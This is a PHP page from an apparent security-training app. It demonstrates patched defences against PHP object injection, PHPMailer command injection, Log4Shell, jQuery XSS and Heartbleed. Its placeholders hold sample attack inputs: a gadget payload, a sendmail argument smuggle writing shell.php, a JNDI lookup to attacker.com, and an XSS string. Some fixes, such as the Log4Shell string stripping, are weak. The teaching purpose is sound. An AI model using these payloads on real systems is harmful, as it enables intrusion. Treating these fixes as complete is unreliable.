<?php
require_once __DIR__ . '/../src/db.php';
require_once __DIR__ . '/../src/helpers.php';
check_auth();

// 1. 定義反序列化使用的 Gadget 類別
class MockFrameworkGadget {
    public $cmd;
    public function __destruct() {
        if (isset($this->cmd) && !empty($this->cmd)) {
            echo "<div class='alert alert-danger mt-3'>🔥 [PHP 反序列化漏洞] 執行析構函數 (Destructor)</div>";
        }
    }
}

$tab = $_GET['tab'] ?? 'deserialization';

$deserial_result = '';
$deserial_error = '';
$phpmailer_result = '';
$phpmailer_error = '';
$log4shell_result = '';
$heartbleed_result = '';
$heartbleed_error = '';

// 2. PHP 反序列化 (Fixed: allowed_classes => false 禁用類別實體化)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $tab === 'deserialization') {
    $serialized_data = $_POST['data'] ?? '';
    try {
        $deserial_result = unserialize($serialized_data, ['allowed_classes' => false]);
        
        if (is_object($deserial_result) || $deserial_result === false) {
            $deserial_result = "🛡️ 偵測到不安全的反序列化物件！該物件實體已被安全機制攔截，未進行 any 類別載入。";
        }
    } catch (Exception $e) {
        $deserial_error = $e->getMessage();
    }
}

// 3. PHPMailer RCE (Fixed: 嚴格格式過濾 & escapeshellarg 跳脫)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $tab === 'phpmailer') {
    $email = $_POST['email'] ?? '';
    $subject = $_POST['subject'] ?? '';
    $message = $_POST['message'] ?? '';
    
    try {
        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            $phpmailer_error = "無效的電子郵件格式！";
        } else {
            $safe_email = escapeshellarg($email);
            $sendmail_args = "-t -i -f" . $safe_email;
            
            $phpmailer_result = "🟢 [模擬郵件伺服器調用]<br>安全指令：<code>sendmail $sendmail_args</code><br>郵件已成功排入發送佇列！";
        }
    } catch (Exception $e) {
        $phpmailer_error = $e->getMessage();
    }
}

// 4. Apache Log4Shell (Fixed: 停用日誌中的 Lookups / 過濾 JNDI 標記)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $tab === 'log4shell') {
    $user_agent = $_POST['user_agent'] ?? '';
    
    $safe_user_agent = str_ireplace(['${jndi:', '${'], '', $user_agent);
    
    $log4shell_result = "
    <div class='alert alert-success'>✅ [安全日誌引擎] 日誌寫入成功，Lookups 解析功能已禁用！</div>
    <p class='text-muted'>過濾後的日誌紀錄內容：</p>
    <pre class='bg-dark text-white p-3 border rounded'>[INFO] " . date('Y-m-d H:i:s') . " - User-Agent: " . htmlspecialchars($safe_user_agent) . " - Access Granted</pre>";
}

// 5. OpenSSL Heartbleed (Fixed: 驗證實際長度是否與宣告的長度相符)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $tab === 'heartbleed') {
    $payload = $_POST['payload'] ?? '';
    $length = (int)($_POST['length'] ?? 0);
    
    $actual_len = strlen($payload);
    
    // 安全版防禦：驗證實際長度是否小於宣告的長度
    if ($length > $actual_len) {
        $heartbleed_error = "🛡️ [安全機制攔截] 請求宣告之長度 ($length) 大於實際 Payload 長度 ($actual_len)！拒絕處理以防止緩衝區超額讀取 (Heartbleed)。";
    } else {
        $heartbleed_result = [
            'sent' => $payload,
            'requested_length' => $length,
            'actual_length' => $actual_len,
            'response' => substr($payload, 0, $length)
        ];
    }
}
?>
<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <title>🛡️ 第三方套件漏洞安全修補驗證 - VulnCampus</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <style>
        body { background-color: #f8fafc; color: #1e293b; font-family: 'Noto Sans TC', sans-serif; padding-top: 50px; }
        .hero { background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #334155 100%); color: white; padding: 45px 30px; border-radius: 16px; margin-bottom: 40px; box-shadow: 0 10px 30px rgba(15, 23, 42, 0.08); border: 1px solid rgba(255, 255, 255, 0.05); }
        .card { background-color: #ffffff; border: 1px solid #e2e8f0; border-radius: 14px; margin-bottom: 24px; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05); }
        .card-header { background-color: #f1f5f9; border-bottom: 1px solid #e2e8f0; color: #0f172a; font-weight: 700; }
        .nav-tabs .nav-link { color: #64748b; border: none; }
        .nav-tabs .nav-link.active { background-color: #ffffff; color: #0f172a; border: 1px solid #e2e8f0; border-bottom-color: #ffffff; border-radius: 8px 8px 0 0; font-weight: bold; }
        .btn-primary { background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%); border: none; border-radius: 8px; font-weight: 600; }
        .btn-primary:hover { background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%); }
    </style>
</head>
<body>

<div class="container my-5">
    <div class="d-flex justify-content-between align-items-center mb-4 border-bottom pb-2">
        <h2>🛡️ 第三方套件與經典元件漏洞防禦驗證 (Component Vulnerabilities)</h2>
        <div>
            <span class="mr-3 text-muted">您好，<strong><?= $_SESSION['user']['name'] ?></strong></span>
            <a href="/index.php" class="btn btn-secondary">回首頁</a>
        </div>
    </div>

    <div class="hero shadow">
        <h1>經典第三方套件安全防禦對照</h1>
        <p class="lead">🟢 此頁面已完全套用安全防禦機制（反序列化白名單、日誌禁用解析、信箱命令跳脫、升級安全版 jQuery、Heartbleed 封包長度校驗）！</p>
    </div>

    <!-- 頁籤導覽 -->
    <ul class="nav nav-tabs mb-4">
        <li class="nav-item">
            <a class="nav-link <?= $tab === 'deserialization' ? 'active' : '' ?>" href="?tab=deserialization">⚡ PHP 反序列化 (Object Injection)</a>
        </li>
        <li class="nav-item">
            <a class="nav-link <?= $tab === 'phpmailer' ? 'active' : '' ?>" href="?tab=phpmailer">✉️ PHPMailer RCE (CVE-2016-10033)</a>
        </li>
        <li class="nav-item">
            <a class="nav-link <?= $tab === 'log4shell' ? 'active' : '' ?>" href="?tab=log4shell">💥 Apache Log4Shell (CVE-2021-44228)</a>
        </li>
        <li class="nav-item">
            <a class="nav-link <?= $tab === 'jquery' ? 'active' : '' ?>" href="?tab=jquery">📦 jQuery 選擇器 XSS (CVE-2015-9251)</a>
        </li>
        <li class="nav-item">
            <a class="nav-link <?= $tab === 'heartbleed' ? 'active' : '' ?>" href="?tab=heartbleed">💔 OpenSSL Heartbleed (CVE-2014-0160)</a>
        </li>
    </ul>

    <div class="row">
        <!-- 演練表單與說明 -->
        <div class="col-md-7">
            
            <!-- PHP Deserialization -->
            <?php if ($tab === 'deserialization'): ?>
            <div class="card shadow-sm">
                <div class="card-header">⚡ PHP 反序列化漏洞 (PHP Deserialization)</div>
                <div class="card-body">
                    <p class="text-muted">當系統將不受信任的序列化字串直接傳入 <code>unserialize()</code> 時，若系統環境中含有具備敏感魔術方法（如 <code>__destruct()</code>）的類別元件，即可引發遠端指令執行（RCE）。</p>
                    <form method="POST" action="?tab=deserialization">
                        <div class="form-group">
                            <label for="data" class="font-weight-bold">請輸入序列化後的物件資料 (Serialized Data)：</label>
                            <textarea name="data" id="data" rows="3" class="form-control border-secondary" placeholder='例如：O:19:"MockFrameworkGadget":1:{s:3:"cmd";s:6:"whoami";}' required></textarea>
                        </div>
                        <button type="submit" class="btn btn-primary btn-block">發送反序列化資料</button>
                    </form>
                    
                    <div class="alert alert-success mt-4">
                        🛡️ <strong>防護原理：</strong><br>
                        安全修正版配置了 <code>unserialize($data, ['allowed_classes' => false])</code>。即使攻擊者傳入 Gadget 物件，PHP 引擎也會被強制限制載入並實體化任何類別，防止析構魔術方法被惡意調用。
                    </div>
                </div>
            </div>
            <?php endif; ?>

            <!-- PHPMailer RCE -->
            <?php if ($tab === 'phpmailer'): ?>
            <div class="card shadow-sm">
                <div class="card-header">✉️ PHPMailer 郵件元件命令注入 (CVE-2016-10033)</div>
                <div class="card-body">
                    <p class="text-muted">知名發信元件 PHPMailer 早期版本中，在呼叫 PHP <code>mail()</code> 發信時，由於未對寄件者信箱（Sender）做嚴格的 shell 參數過濾，導致攻擊者可以透過構造特殊信箱結構注入額外的 sendmail 引數參數發動 RCE。</p>
                    <form method="POST" action="?tab=phpmailer">
                        <div class="form-group">
                            <label for="email" class="font-weight-bold">寄件者信箱 (Email)：</label>
                            <input type="text" name="email" id="email" class="form-control border-secondary" placeholder="例如: attacker -OQueueDirectory=/tmp -X/var/www/html/shell.php@sender.com" required>
                        </div>
                        <div class="form-group">
                            <label for="subject" class="font-weight-bold">郵件主旨：</label>
                            <input type="text" name="subject" id="subject" class="form-control border-secondary" value="測試發信">
                        </div>
                        <div class="form-group">
                            <label for="message" class="font-weight-bold">郵件內容：</label>
                            <textarea name="message" id="message" rows="3" class="form-control border-secondary">PHPMailer 漏洞演練</textarea>
                        </div>
                        <button type="submit" class="btn btn-primary btn-block">發送郵件</button>
                    </form>
                    
                    <div class="alert alert-success mt-4">
                        🛡️ <strong>防護原理：</strong><br>
                        1. 使用 <code>FILTER_VALIDATE_EMAIL</code> 進行電子郵件信箱格式驗證，任何包含空白或 shell 控制符的非法信箱將直接被攔截。<br>
                        2. 在調用系統指令發信時，使用 <code>escapeshellarg()</code> 將整個 Email 字串完整跳脫與包裹，防止其被分離為獨立引數命令。
                    </div>
                </div>
            </div>
            <?php endif; ?>

            <!-- Log4Shell -->
            <?php if ($tab === 'log4shell'): ?>
            <div class="card shadow-sm">
                <div class="card-header">💥 Apache Log4Shell 模擬演練 (CVE-2021-44228)</div>
                <div class="card-body">
                    <p class="text-muted">知名 Java 日誌庫 Log4j 由於不安全地支持了 JNDI 表達式，使得日誌中一旦出現特定格式（如 <code>${jndi:ldap://...}</code>），日誌庫便會自動連線遠端 LDAP 伺服器下載並執行任意惡意 Java 類別，造成最嚴重的 RCE 攻擊。</p>
                    <form method="POST" action="?tab=log4shell">
                        <div class="form-group">
                            <label for="user_agent" class="font-weight-bold">發送存取日誌 (模擬 User-Agent 寫入)：</label>
                            <input type="text" name="user_agent" id="user_agent" class="form-control border-secondary" placeholder="例如: ${jndi:ldap://attacker.com/Exploit}" required>
                        </div>
                        <button type="submit" class="btn btn-primary btn-block">記錄存取日誌</button>
                    </form>
                    
                    <div class="alert alert-success mt-4">
                        🛡️ <strong>防護原理：</strong><br>
                        1. 禁用日誌引擎的 Message Lookups 功能（在 Log4j2 中設定 <code>formatMsgNoLookups=true</code>）。<br>
                        2. 在日誌紀錄前直接過濾或移去 <code>${</code> 等表達式起始字元，阻止 JNDI 解析器的語法載入。
                    </div>
                </div>
            </div>
            <?php endif; ?>

            <!-- jQuery Selector XSS -->
            <?php if ($tab === 'jquery'): ?>
            <div class="card shadow-sm">
                <div class="card-header">🛡️ 安全版 jQuery 與選擇器過濾 (CVE-2015-9251 防禦)</div>
                <div class="card-body">
                    <p class="text-muted">安全版將 jQuery 升級至最新的 <strong>3.7.1</strong>，並在前端程式中拒絕直接將包含 HTML 特徵的字串傳入 <code>$()</code>。建立 HTML 節點應採用安全 API 或進行字元過濾。</p>
                    <div class="form-group mb-3">
                        <label for="jq-input" class="font-weight-bold">請輸入 jQuery 選擇器字串 (Selector / HTML)：</label>
                        <input type="text" id="jq-input" class="form-control border-secondary" placeholder="例如: <img src=x onerror=alert('jQuery-XSS')>" required>
                    </div>
                    <button type="button" id="btn-jq-test" class="btn btn-primary btn-block">以 $() 載入並渲染</button>
                    
                    <div class="alert alert-success mt-4">
                        🛡️ <strong>防護原理：</strong><br>
                        1. 升級至 <strong>jQuery 3.5.0+</strong>，在內部已內建安全解析過濾機制。<br>
                        2. 程式碼端加入了嚴格判斷：如果輸入以 <code>&lt;</code> 開頭，將被安全攔截，禁止使用 <code>$()</code> 直接轉化為 DOM 渲染。
                    </div>
                </div>
            </div>
            <!-- 載入安全版本 jQuery 3.7.1 -->
            <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
            <script>
                document.getElementById('btn-jq-test').addEventListener('click', function() {
                    var rawInput = document.getElementById('jq-input').value.trim();
                    if (rawInput) {
                        // 防護邏輯：拒絕以 < 開頭的潛在 HTML 標籤注入
                        if (rawInput.startsWith('<')) {
                            $('#jq-result-box').html("<div class='alert alert-danger font-weight-bold'>🛡️ [防禦成功] 系統偵測到非法 HTML 注入字元！已阻止將其傳入 $() 渲染。</div>");
                        } else {
                            try {
                                var $el = $(rawInput);
                                $('#jq-result-box').html("<div class='alert alert-success'>成功解析選擇器！</div>");
                            } catch(e) {
                                $('#jq-result-box').html("<div class='alert alert-warning'>選擇器語法無效。</div>");
                            }
                        }
                    }
                });
            </script>
            <?php endif; ?>

            <!-- OpenSSL Heartbleed -->
            <?php if ($tab === 'heartbleed'): ?>
            <div class="card shadow-sm">
                <div class="card-header">🛡️ 安全版 Heartbeat 封包長度校驗 (Heartbleed 防禦)</div>
                <div class="card-body">
                    <p class="text-muted">防禦版對 Heartbeat 請求的實際 Payload 長度與宣告的長度欄位進行了精確比對。若發現宣告長度大於實際資料長度，則拒絕處理，徹底消除了緩衝區超額讀取的可能性。</p>
                    <form method="POST" action="?tab=heartbleed">
                        <div class="form-group mb-3">
                            <label for="payload" class="font-weight-bold">傳送的 Heartbeat 測試字串 (Payload)：</label>
                            <input type="text" name="payload" id="payload" class="form-control border-secondary" value="hello" required>
                        </div>
                        <div class="form-group mb-3">
                            <label for="length" class="font-weight-bold">封包宣告的長度欄位 (Length Field)：</label>
                            <input type="number" name="length" id="length" class="form-control border-secondary" min="1" max="2000" value="500" required>
                        </div>
                        <button type="submit" class="btn btn-primary btn-block">傳送 Heartbeat 封包</button>
                    </form>
                    
                    <div class="alert alert-success mt-4">
                        🛡️ <strong>防護原理：</strong><br>
                        在 C 語言或 PHP 處理二進位長度時，安全程式碼必須進行**邊界檢查**：<br>
                        <code>if (specified_length > actual_payload_length) { throw_error(); }</code><br>
                        禁止盲目信任長度欄位複製鄰近記憶體緩衝區資料，是杜絕 Heartbleed 類型漏洞的核心防線。
                    </div>
                </div>
            </div>
            <?php endif; ?>

        </div>

        <!-- 結果展示區 -->
        <div class="col-md-5">
            <div class="card shadow-sm" style="min-height: 420px;">
                <div class="card-header bg-dark text-white">📊 執行與響應結果</div>
                <div class="card-body bg-light text-dark" style="max-height: 520px; overflow-y: auto;">
                    
                    <!-- Deserialization 結果 -->
                    <?php if ($tab === 'deserialization'): ?>
                        <?php if ($deserial_error): ?>
                            <div class="alert alert-danger font-weight-bold">❌ 錯誤：<?= htmlspecialchars($deserial_error) ?></div>
                        <?php elseif ($deserial_result): ?>
                            <div class="alert alert-info">執行結果：</div>
                            <pre class="bg-white p-3 border rounded"><?= htmlspecialchars(print_r($deserial_result, true)) ?></pre>
                        <?php else: ?>
                            <p class="text-muted text-center mt-5">等待傳入序列化資料...</p>
                        <?php endif; ?>
                    <?php endif; ?>

                    <!-- PHPMailer 結果 -->
                    <?php if ($tab === 'phpmailer'): ?>
                        <?php if ($phpmailer_error): ?>
                            <div class="alert alert-danger font-weight-bold">❌ 錯誤：<?= htmlspecialchars($phpmailer_error) ?></div>
                        <?php elseif ($phpmailer_result): ?>
                            <div class="p-3 border rounded bg-white text-dark">
                                <?= $phpmailer_result ?>
                            </div>
                        <?php else: ?>
                            <p class="text-muted text-center mt-5">等待發信...</p>
                        <?php endif; ?>
                    <?php endif; ?>

                    <!-- Log4Shell 結果 -->
                    <?php if ($tab === 'log4shell'): ?>
                        <?php if ($log4shell_result): ?>
                            <div class="p-3 border rounded bg-white text-dark">
                                <?= $log4shell_result ?>
                            </div>
                        <?php else: ?>
                            <p class="text-muted text-center mt-5">等待日誌寫入...</p>
                        <?php endif; ?>
                    <?php endif; ?>

                    <!-- jQuery 結果 -->
                    <?php if ($tab === 'jquery'): ?>
                        <div id="jq-result-box">
                            <p class="text-muted text-center mt-5">等待輸入選擇器測試...</p>
                        </div>
                    <?php endif; ?>

                    <!-- Heartbleed 結果 -->
                    <?php if ($tab === 'heartbleed'): ?>
                        <?php if ($heartbleed_error): ?>
                            <div class="alert alert-danger font-weight-bold">❌ 錯誤訊息：</div>
                            <div class="p-3 border rounded bg-white text-danger font-weight-bold">
                                <?= htmlspecialchars($heartbleed_error) ?>
                            </div>
                        <?php elseif ($heartbleed_result): ?>
                            <div class="alert alert-success">🟢 Heartbeat 響應成功：</div>
                            <div class="p-3 border rounded bg-dark text-success" style="font-family: monospace; word-break: break-all;">
                                <strong>回傳資料：</strong> "<?= htmlspecialchars($heartbleed_result['response']) ?>" (<?= strlen($heartbleed_result['response']) ?> 字元)<br>
                                <span class="text-muted">（記憶體緩衝區邊界檢查正常，未發生超讀洩漏）</span>
                            </div>
                        <?php else: ?>
                            <p class="text-muted text-center mt-5">等待傳送 Heartbeat 封包...</p>
                        <?php endif; ?>
                    <?php endif; ?>

                </div>
            </div>
        </div>
    </div>
</div>

</body>
</html>
